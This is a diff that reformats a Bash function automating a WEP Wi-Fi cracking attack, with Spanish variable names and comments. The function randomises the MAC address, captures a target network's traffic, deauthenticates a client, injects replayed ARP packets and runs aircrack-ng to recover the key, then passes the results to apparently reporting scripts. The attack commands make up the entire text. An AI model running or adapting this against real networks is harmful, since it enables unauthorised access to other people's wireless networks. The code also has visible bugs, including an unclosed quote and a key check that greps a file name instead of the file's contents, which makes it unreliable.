@@ -1,64 +1,61 @@
 AircrackWEP() {
-	echo "***************** Aircrack WEP******************"
-	CambioMacRandom
-	LINEA_AUX=$LINEA_ATAQUE
-	LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
-	BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
-	CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
-	ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
-	PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
-	CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
-	TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+      echo "***************** Aircrack WEP******************"
+      CambioMacRandom
+      LINEA_AUX=$LINEA_ATAQUE
+      LINEA_ATAQUE=$(head -$LINEA_ATAQUE "$ARCHIVO_REDES_SCAN" | tail -1)
+      BSSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $3 '})
+      CANAL=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $4 '})
+      ESSID=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $9 '})
+      PRIVACY=$(echo "$LINEA_ATAQUE" | awk -F "|" {' print $5 '})
+      CLIENT=$(cat $ARCHIVO_CAPTURAS-clients.csv | grep $BSSID)
+      TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+      
+    if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
+    then
+        #Utilizo mi propia interfaz para realizar falsa autenticacion
+        TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
+    else
+        TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
+    fi
 
-	if [ ! `echo $TARJETA_SELECCIONADA_MAC | grep ":"` ]
-	then
-		#Utilizo mi propia interfaz para realizar falsa autenticacion
-		TARJETA_SELECCIONADA_MAC=$(head -1 "$LOG_TARJETA" | tail -1)
-	else
-		TARJETA_SELECCIONADA_MAC=$(echo "$CLIENT" | awk -F "," {' print $1 '})		
-	fi
+        TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
+        sudo airmon-ng stop $TARJETA_MODO_MONITOR
 
-	TARJETA_MODO_MONITOR=$(head -1 "$ARCHIVO_TARJETA_MONITOR" | tail -1) 
-	sudo airmon-ng stop $TARJETA_MODO_MONITOR
+        TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk 	'{print $1}' | sort)	
+        INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
+        sudo airmon-ng start $INTERFAZ $CANAL
+        X1="airmon-ng start $INTERFAZ $CANAL"
+        airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
+        X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
+        echo "....Comienzo a inyectar..."
 
-	TARJETAS_WIFI_DISPONIBLES=$(iwconfig --version | grep "Recommend" | awk 	'{print $1}' | sort)	
-	INTERFAZ=$(echo $TARJETAS_WIFI_DISPONIBLES | awk '{print $1}')
-	sudo airmon-ng start $INTERFAZ $CANAL
-	X1="airmon-ng start $INTERFAZ $CANAL"
-	
-	airodump-ng -c $CANAL --bssid $BSSID -w $CAPTURA_AIRCRACK $TARJETA_MODO_MONITOR
-	X2="airodump-ng -c $CANAL --bssid $BSSID -w output $TARJETA_MODO_MONITOR"
-	echo "....Comienzo a inyectar..."
+        aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
+        X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+        aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
+        X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
+        TIEMPO_ESCANEO="120"
+    for A in `seq 1 $TIEMPO_ESCANEO` 
+      do
+            sleep 1s
+          if [ $A -eq $TIEMPO_ESCANEO ]
+          then
+              X5="aircrack-ng -a 1 -s output-01.cap"
+              aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat
+ 	  else
+               TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
+          fi
+      done
+         EsperarAcabarAircrack 10
+         X6=`cat "aircrack-$BSSID.dat" | grep "WEP" | awk -F '(' '{print $2}' | awk -F 'IVs' '{print $1}'`
+         X8=`cat "aircrack-$BSSID.dat" | grep "KEY FOUND"`
+         X7="SI"
+        if [ ! `echo "aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]
+        then
+            X7="NO"
+        fi
+            X9="aircrack-$BSSID.dat"
 
-	aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
-	X3="aireplay-ng -0 5 -a $BSSID -c $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
-	aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR
-	X4="aireplay-ng -3 -b $BSSID -h $TARJETA_SELECCIONADA_MAC $TARJETA_MODO_MONITOR"
-	
-	TIEMPO_ESCANEO="120"
-	for A in `seq 1 $TIEMPO_ESCANEO` 
-	do
-		sleep 1s
-		if [ $A -eq $TIEMPO_ESCANEO ]
-		then
-			X5="aircrack-ng -a 1 -s output-01.cap"
-			aircrack-ng -a 1 -s "$CAPTURA_AIRCRACK-01.cap" >> "$RUTA_AIRCRACK/aircrack-$BSSID.dat
-		else
-			TIEMPO_RESTANTE=$(expr $TIEMPO_ESCANEO - $A)
-		fi
-	done
-	EsperarAcabarAircrack 10
-	X6=`cat "aircrack-$BSSID.dat" | grep "WEP" | awk -F '(' '{print $2}' | awk -F 'IVs' '{print $1}'`
-	X8=`cat "aircrack-$BSSID.dat" | grep "KEY FOUND"`
-	X7="SI"
-	if [ ! `echo "aircrack-$BSSID.dat" | grep "KEY FOUND"`  ]
-	then
-		X7="NO"
-	fi
-	X9="aircrack-$BSSID.dat"
-
-	(`sudo python "$RUTA_INFORME/SECWEP1.py" $BSSID "$ESSID" $CANAL $TARJETA_SELECCIONADA_MAC`)
-	(`sudo python "$RUTA_INFORME/SUBSWEP1.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7" "$X8" "$X9"`)
-
-	unset A, X1, X2, X3, X4, X5, X6, X7, X8, X9, BSSID, CANAL, ESSID
+         (`sudo python "$RUTA_INFORME/SECWEP1.py" $BSSID "$ESSID" $CANAL $TARJETA_SELECCIONADA_MAC`)
+         (`sudo python "$RUTA_INFORME/SUBSWEP1.py" "$X1" "$X2" "$X3" "$X4" "$X5" "$X6" "$X7" "$X8" "$X9"`)
+ 	  unset A, X1, X2, X3, X4, X5, X6, X7, X8, X9, BSSID, CANAL, ESSID 
 }
